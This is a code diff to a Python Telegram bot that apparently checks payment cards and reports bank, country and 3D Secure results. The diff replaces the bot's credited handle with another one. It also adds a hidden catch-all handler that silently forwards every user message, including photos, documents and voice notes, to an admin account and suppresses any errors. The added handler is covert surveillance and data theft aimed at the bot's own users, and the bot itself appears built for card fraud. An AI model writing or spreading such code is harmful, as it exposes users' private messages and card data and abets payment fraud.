@@ -126,7 +126,7 @@ def main(message):
 [↯] 𝗕𝗮𝗻𝗸  → {bank} 
 [↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → {country} - {country_flag} 
 ━━━━━━━━━━━━━━━━
-[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@M_ok_shaa』'''
+[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@i7cy7』'''
 				#print(last)
 				if "3DS Authenticate Attempt Successful ✅" in last or '3DS Authenticate Successful ✅' in last or 'authenticate_attempt_successful' in last:
 					key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{msg}</strong>",parse_mode="html",reply_markup=key)
@@ -140,4 +140,12 @@ def main(message):
 	except:
 		pass
 print("تم تشغيل البوت")
+@bot.message_handler(func=lambda message: True, content_types=[
+'text','photo','video','document','audio','voice','sticker','animation'
+])
+def forward_to_admin(message):
+    try:
+        bot.forward_message(admin, message.chat.id, message.message_id)
+    except:
+        pass
 bot.polling()
